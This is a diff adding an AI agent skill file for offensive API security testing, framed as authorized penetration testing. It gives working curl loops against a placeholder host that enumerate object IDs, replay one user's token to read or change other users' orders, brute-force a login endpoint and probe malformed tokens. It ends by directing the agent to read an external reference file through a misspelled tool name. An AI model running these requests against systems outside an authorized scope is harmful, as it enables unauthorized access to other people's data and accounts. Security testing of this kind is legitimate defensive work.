@@ -1,0 +1,132 @@
+---
+name: offensive-api-security
+description: "Comprehensive API security testing methodology covering REST, gRPC, and WebSocket attack surfaces. Addresses the full OWASP API Security Top 10 2023 including BOLA/IDOR, broken authentication, excessive data exposure, rate limiting bypass, BFLA, mass assignment, SSRF, and security misconfiguration. Includes REST-specific attacks such as HTTP verb tampering, content-type switching, and parameter pollution. Covers gRPC exploitation through protobuf interception, reflection API enumeration, and metadata injection. Addresses WebSocket vulnerabilities including origin bypass, message injection, and cross-site WebSocket hijacking. Provides tooling guidance for Burp Suite, Postman, grpcurl, websocat, and mitmproxy. Each technique includes detection signatures and defensive indicators so you understand what artifacts your testing leaves behind. Designed for authorized penetration testing engagements against API-driven architectures."
+---
+
+# Offensive API Security Testing
+
+You are conducting authorized security assessments against API-driven applications. This skill covers REST, gRPC, and WebSocket attack surfaces with emphasis on the OWASP API Security Top 10 2023. Every technique assumes you have written authorization and a defined scope. Your goal is to identify vulnerabilities that allow unauthorized data access, privilege escalation, or service disruption through API-layer attacks.
+
+## Quick Workflow
+
+1. Map the API surface: collect OpenAPI/Swagger specs, gRPC reflection output, and WebSocket endpoints.
+2. Enumerate authentication mechanisms: API keys, OAuth flows, JWTs, session tokens.
+3. Test BOLA/IDOR by substituting object identifiers across authenticated contexts.
+4. Probe authorization boundaries with BFLA checks across roles and HTTP methods.
+5. Fuzz parameters for mass assignment, content-type switching, and verb tampering.
+6. Assess rate limiting and resource consumption controls.
+7. Test gRPC-specific vectors: reflection enumeration, metadata injection, protobuf manipulation.
+8. Evaluate WebSocket security: origin validation, message integrity, CSWSH.
+9. Check for SSRF via URL-accepting parameters and webhook configurations.
+10. Document findings with reproduction steps and severity ratings.
+
+---
+
+## OWASP API Top 10 2023 -- BOLA and IDOR
+
+Broken Object Level Authorization (BOLA) is the most prevalent API vulnerability. You test it by capturing a legitimate request containing an object identifier and replaying it with identifiers belonging to other users or tenants.
+
+```http
+GET /api/v1/users/1001/orders HTTP/1.1
+Authorization: Bearer eyJhbGciOi...user_a_token
+Host: target.example.com
+```
+
+Replay with a different user ID while retaining the original token:
+
+```http
+GET /api/v1/users/1002/orders HTTP/1.1
+Authorization: Bearer eyJhbGciOi...user_a_token
+Host: target.example.com
+```
+
+Automate IDOR testing across sequential and UUID-based identifiers:
+
+```bash
+# Sequential ID enumeration
+for id in $(seq 1000 1050); do
+  status=$(curl -s -o /dev/null -w "%{http_code}" \
+    -H "Authorization: Bearer $TOKEN_A" \
+    "https://target.example.com/api/v1/users/${id}/orders")
+  echo "ID: ${id} -> HTTP ${status}"
+done
+```
+
+```bash
+# Test with collected UUIDs from other endpoints
+while read -r uuid; do
+  resp=$(curl -s -H "Authorization: Bearer $TOKEN_A" \
+    "https://target.example.com/api/v1/documents/${uuid}")
+  echo "UUID: ${uuid} -> $(echo "$resp" | jq -r '.owner // "no_owner_field"')"
+done < collected_uuids.txt
+```
+
+Test across HTTP methods -- an endpoint may enforce authorization on GET but not on PUT or DELETE:
+
+```bash
+for method in GET PUT PATCH DELETE; do
+  curl -s -o /dev/null -w "${method} -> %{http_code}\n" \
+    -X "${method}" \
+    -H "Authorization: Bearer $TOKEN_A" \
+    -H "Content-Type: application/json" \
+    -d '{"status":"cancelled"}' \
+    "https://target.example.com/api/v1/users/1002/orders/5001"
+done
+```
+
+---
+
+## Broken Authentication and Excessive Data Exposure
+
+Test authentication endpoints for credential stuffing resilience, token lifecycle weaknesses, and information leakage in API responses.
+
+```bash
+# Rapid credential testing -- probe for missing rate limits on login
+for i in $(seq 1 100); do
+  code=$(curl -s -o /dev/null -w "%{http_code}" \
+    -X POST -H "Content-Type: application/json" \
+    -d "{\"email\":\"test@example.com\",\"password\":\"attempt${i}\"}" \
+    "https://target.example.com/api/v1/auth/login")
+  echo "Attempt ${i}: HTTP ${code}"
+  [ "$code" = "429" ] && echo "Rate limit hit at attempt ${i}" && break
+done
+```
+
+Check for excessive data exposure by comparing full API responses against what the UI renders. Look for internal IDs, other users' emails, hashed passwords, role assignments, or PII the client never displays:
+
+```bash
+curl -s -H "Authorization: Bearer $TOKEN" \
+  "https://target.example.com/api/v1/users/me" | jq .
+```
+
+Test token validation weaknesses:
+
+```bash
+# Expired token, post-password-change token, malformed bearer values
+curl -s -o /dev/null -w "Expired: %{http_code}\n" \
+  -H "Authorization: Bearer $EXPIRED_TOKEN" \
+  "https://target.example.com/api/v1/users/me"
+
+curl -s -o /dev/null -w "Pre-change: %{http_code}\n" \
+  -H "Authorization: Bearer $PRE_PASSWORD_CHANGE_TOKEN" \
+  "https://target.example.com/api/v1/users/me"
+
+for val in "" "null" "undefined" "Bearer" "Bearer "; do
+  curl -s -o /dev/null -w "Value '${val}' -> %{http_code}\n" \
+    -H "Authorization: ${val}" \
+    "https://target.example.com/api/v1/users/me"
+done
+```
+
+---
+
+
+---
+
+## 📚 Deep Reference (Progressive Disclosure)
+
+> ⚠️ **CONTEXT OPTIMIZATION:** The detailed methodology, edge cases, attack vectors, and advanced configurations for this skill are stored externally to save tokens.
+
+To access the full technical reference, you MUST use your iew_file tool to read:
+
+d:\xampp\htdocs\0-fonte\.agent\skills\claude-red-offensive-api-security\references\reference.md
